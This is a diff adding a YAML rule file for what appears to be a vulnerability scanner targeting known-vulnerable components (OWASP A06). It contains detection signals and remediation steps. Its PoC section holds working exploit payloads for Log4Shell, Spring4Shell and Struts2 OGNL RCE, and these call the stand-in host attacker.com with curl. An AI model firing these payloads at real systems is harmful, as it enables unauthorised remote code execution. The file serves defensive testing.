@@ -1,0 +1,104 @@
+id: "rule-known-vulnerable-components"
+name: "Using Components with Known Vulnerabilities"
+name_cn: "使用含已知漏洞的组件"
+description: "应用使用的第三方库、框架、中间件版本存在已知 CVE，攻击者可利用这些漏洞攻击系统"
+
+owasp_category: "A06-vulnerable-components"
+owasp_subcategory: "Vulnerable Components"
+cwe_id: "CWE-1104"
+
+cvss:
+  vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+  base_score: 9.8
+  severity: "critical"
+
+detection:
+  methods: ["DAST", "SAST"]
+  dast_signals:
+    high_specificity:
+      - type: "cve_exploit_confirmed"
+        pattern: "known_cve_exploit_succeeds"
+        confidence: 0.98
+      - type: "version_match_high_risk_cve"
+        pattern: "detected_version_in_vulnerable_range"
+        confidence: 0.85
+    medium_specificity:
+      - type: "component_fingerprint"
+        pattern: "server_header_or_body_reveals_component"
+        confidence: 0.65
+      - type: "default_page"
+        pattern: "(Apache Tomcat|nginx|Jetty|Express|PHP/[0-9])"
+        confidence: 0.60
+    low_specificity:
+      - type: "tech_stack_detection"
+        pattern: "wappalyzer_fingerprint_match"
+        confidence: 0.40
+  sast_patterns:
+    - language: "all"
+      pattern: "dependencies.*(version.*<|version.*:.*['\"]?[0-9])"
+      confidence: 0.70
+  multi_layer:
+    enabled: true
+    min_signals: 2
+    high_specificity_skips_min: true
+  false_positive_filters:
+    - filter: "version_not_vulnerable"
+      condition: "detected_version_is_patched"
+      action: "discard"
+    - filter: "component_not_exploitable"
+      condition: "vulnerability_requires_unreachable_config"
+      action: "downgrade"
+      target_confidence: "low"
+
+poc:
+  enabled: true
+  request_template: |
+    GET {{url}} HTTP/1.1
+    Host: {{host}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+    Accept: */*
+    Connection: close
+  payloads:
+    - name: "log4shell_jndi"
+      value: "${jndi:ldap://attacker.com/Exploit}"
+      description: "Log4Shell CVE-2021-44228"
+      risk: "critical"
+    - name: "spring4shell"
+      value: "{{T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/rce')}}"
+      description: "Spring4Shell CVE-2022-22965"
+      risk: "critical"
+    - name: "shiro_deserialization"
+      value: "{{shiro_gadget_chain}}"
+      description: "Apache Shiro 反序列化 CVE-2016-4437"
+      risk: "critical"
+    - name: "struts2_rce"
+      value: "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='curl http://attacker.com/rce').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+      description: "Struts2 OGNL 注入 RCE"
+      risk: "critical"
+  verification:
+    - type: "version_match"
+      description: "对比检测到的版本与 CVE 影响版本范围"
+    - type: "exploit_success"
+      description: "CVE PoC 执行成功（OOB 回调）"
+    - type: "nuclei_template_match"
+      description: "nuclei 对应模板命中"
+
+remediation:
+  priority: "P0"
+  summary: "升级所有第三方组件到安全版本，建立依赖管理流程"
+  details:
+    - "定期扫描依赖清单（npm audit, pip-audit, mvn dependency-check）"
+    - "订阅 CVE 公告，及时升级含漏洞的组件"
+    - "使用 SCA（软件成分分析）工具持续监控依赖安全状况"
+    - "建立漏洞响应 SLA：Critical 24h, High 72h, Medium 30d"
+    - "移除不必要的依赖，减少攻击面"
+    - "使用虚拟补丁（WAF）作为临时缓解措施"
+  references:
+    - "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
+    - "https://cwe.mitre.org/data/definitions/1104.html"
+    - "https://osv.dev/"
+    - "https://nvd.nist.gov/"
+
+knowledge_source:
+  file: "知识库/waf-bypass.md"
+  methodology: "知识库/info-leak-test.md §五 + OSV/CVE 数据库匹配"
